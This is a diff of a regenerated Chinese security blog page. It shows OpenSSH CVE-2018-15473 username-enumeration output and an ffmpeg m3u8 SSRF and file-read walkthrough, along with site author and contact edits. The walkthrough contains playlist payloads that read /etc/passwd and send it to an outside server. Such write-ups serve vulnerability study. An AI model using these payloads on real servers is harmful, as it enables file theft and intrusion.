+dsa is not a valid user!
+fe is not a valid user!
+qf is not a valid user!
+ds is not a valid user!
+vc is not a valid user!
+dsshg is not a valid user!
+rsa is not a valid user!
+grdfsbvfgd is not a valid user!
+sb is not a valid user!
+fgd is not a valid user!
+s is not a valid user!
+bgfd is not a valid user!
+s is not a valid user!
+g is not a valid user!
+fds is not a valid user!
+g is not a valid user!
+fd is not a valid user!
+sgf is not a valid user!
+ds is not a valid user!
+g is not a valid user!
+fdsh is not a valid user!
+tr is not a valid user!
+wnbyrsbf is not a valid user!
+dgs is not a valid user!
+root is a valid user!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>显然漏洞存在，而当我们对高级版本的SSH进行测试时，exp失效</p>
 <p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206171757123.png"></p>
@@ -449,19 +621,40 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
 <li><p>m3u8 文件中以 <strong>#</strong> 开头的字符串要么是注释，要么就是标签。标签以 <strong>#EXT</strong> 开头，大小写敏感。</p>
 </li>
 <li><p>```<br>各参数说明：<br>#EXTM3U 标签是 m3u8 的文件头，开头必须要这一行<br>#EXT-X-MEDIA-SEQUENCE 表示每一个media URI 在 PlayList中只有唯一的序号，相邻之间序号+1<br>#EXTINF:10.0, 表示该一段 TS 流文件的长度<br>#EXT-X-ENDLIST 这个相当于文件结束符</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```m3u8</span><br><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-TARGETDURATION:10</span><br><span class="line">#EXTINF:9.009,</span><br><span class="line">http://media.example.com/first.ts</span><br><span class="line">#EXTINF:9.009,</span><br><span class="line">http://media.example.com/second.ts</span><br><span class="line">#EXTINF:3.003,</span><br><span class="line">http://media.example.com/third.ts</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure></li>
+<pre class="line-numbers language-none"><code class="language-none">
+&#96;&#96;&#96;m3u8
+#EXTM3U
+#EXT-X-TARGETDURATION:10
+#EXTINF:9.009,
+http:&#x2F;&#x2F;media.example.com&#x2F;first.ts
+#EXTINF:9.009,
+http:&#x2F;&#x2F;media.example.com&#x2F;second.ts
+#EXTINF:3.003,
+http:&#x2F;&#x2F;media.example.com&#x2F;third.ts
+#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 </ul>
 </blockquote>
 <p>而在ffmpeg特定版本中并没有对URI进行任何检查，此处可导致SSRF，只需要监听一个端口然后直接访问即可验证</p>
 <p>任意文件读取成因是在ffmpeg中有concat函数可以对URI进行拼接，我们只要将文件作为http请求的参数即可带出，但直接使用concat并不会对文件请求访问，所以我们需要一个小技巧，也就是通过主m3u8访问次级m3u8来使得文件被读取</p>
 <p>kkk.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">concat:http://xxx/test.txt|file:///etc/passwd</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http:&#x2F;&#x2F;xxx&#x2F;test.txt|file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd
+#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>text.txt</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-MEDIA-SEQUENCE:0</span><br><span class="line">#EXTINF:,</span><br><span class="line">http://xxx/?</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:,
+http:&#x2F;&#x2F;xxx&#x2F;?<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>xxx.m3u8</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#EXTM3U</span><br><span class="line">#EXT-X-TARGETDURATION:6</span><br><span class="line">#EXTINF:10.0,</span><br><span class="line">concat:http://xxx/kkk.txt</span><br><span class="line">#EXT-X-ENDLIST</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">#EXTM3U
+#EXT-X-TARGETDURATION:6
+#EXTINF:10.0,
+concat:http:&#x2F;&#x2F;xxx&#x2F;kkk.txt
+#EXT-X-ENDLIST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>将kkk.txt和text.txt都上传到服务器，然后用ffmpeg处理xxx.m3u8文件即可带出passwd文件首行</p>
 <h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><h3 id="CVE-2017-8386"><a href="#CVE-2017-8386" class="headerlink" title="CVE-2017-8386"></a>CVE-2017-8386</h3><p>漏洞成因：</p>
@@ -517,7 +710,7 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="/about" rel="external nofollow noreferrer">Jlan</a>
+                    <a href="/about" rel="external nofollow noreferrer">J1an</a>
                 </span>
             </div>
             <div class="reprint__type">
@@ -540,7 +733,7 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
                     本博客所有文章除特別声明外，均采用
                     <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
                     许可协议。转载请注明来源
-                    <a href="/about" target="_blank">Jlan</a>
+                    <a href="/about" target="_blank">J1an</a>
                     !
                 </span>
             </div>
@@ -583,39 +776,6 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
 
                 </div>
             </div>
-            
-                <div id="reward">
-    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
-
-    <!-- Modal Structure -->
-    <div id="rewardModal" class="modal">
-        <div class="modal-content">
-            <a class="close modal-close"><i class="fas fa-times"></i></a>
-            <h4 class="reward-title">你的赏识是我前进的动力</h4>
-            <div class="reward-content">
-                <div class="reward-tabs">
-                    <ul class="tabs row">
-                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
-                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
-                    </ul>
-                    <div id="alipay">
-                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
-                    </div>
-                    <div id="wechat">
-                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</div>
-
-<script>
-    $(function () {
-        $('.tabs').tabs();
-    });
-</script>
-
             
         </div>
     </div>
@@ -667,7 +827,7 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -695,7 +855,7 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
                     <div class="summary block-with-text">
                         
                             HTTP部分请求头Transfer-Encoding其中中有一类特定编码:chunked编码.该编码将实体分块传送并逐块标明长度,直到长度为0块表示传输结束, 这在实体长度未知时特别有用(比如由数据库动态产生的数据)，该编码格式为
-1234
+Tran
                         
                     </div>
                     <div class="publish-info">
@@ -705,7 +865,7 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
-                            Jlan
+                            J1an
                             
                         </span>
                     </div>
@@ -724,6 +884,9 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
+
+  <!-- 是否加载使用自带的 prismjs. -->
+  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -832,69 +995,15 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
 
     <footer class="page-footer bg-color">
     
-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="netease"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
 
     <div class="container row center-align"
          style="margin-bottom: 0px !important;">
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2022</span>
+                <span id="year">2022</span>
             
-            <a href="/about" target="_blank">Jlan</a>
+            <a href="/about" target="_blank">J1an</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
             |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
@@ -929,7 +1038,7 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
 
 
 
-    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+    <a href="mailto:jlan@icloud.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
         <i class="fas fa-envelope-open"></i>
     </a>
 
@@ -937,10 +1046,8 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
 
 
 
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
+    <a href="https://twitter.com/J1an45" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://twitter.com/J1an45" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
     </a>
 
 
@@ -949,9 +1056,7 @@ OpenSSHCVE-2018-15473漏洞内容：在OpenSSH 7.7前存在一个用户名枚举
 
 
 
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
+
 
 </div>
     </div>
@@ -1111,6 +1216,14 @@ $(function () {
     
 
     <!-- 鼠标星星特效 -->
+     
+        <script type="text/javascript">
+            // 只在桌面版网页启用特效
+            var windowWidth = $(window).width();
+            if (windowWidth > 768) {
+                document.write('<script type="text/javascript" src="/libs/others/star.js"><\/script>');
+            }
+        </script>
     
 
      
@@ -1137,8 +1250,6 @@ $(function () {
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
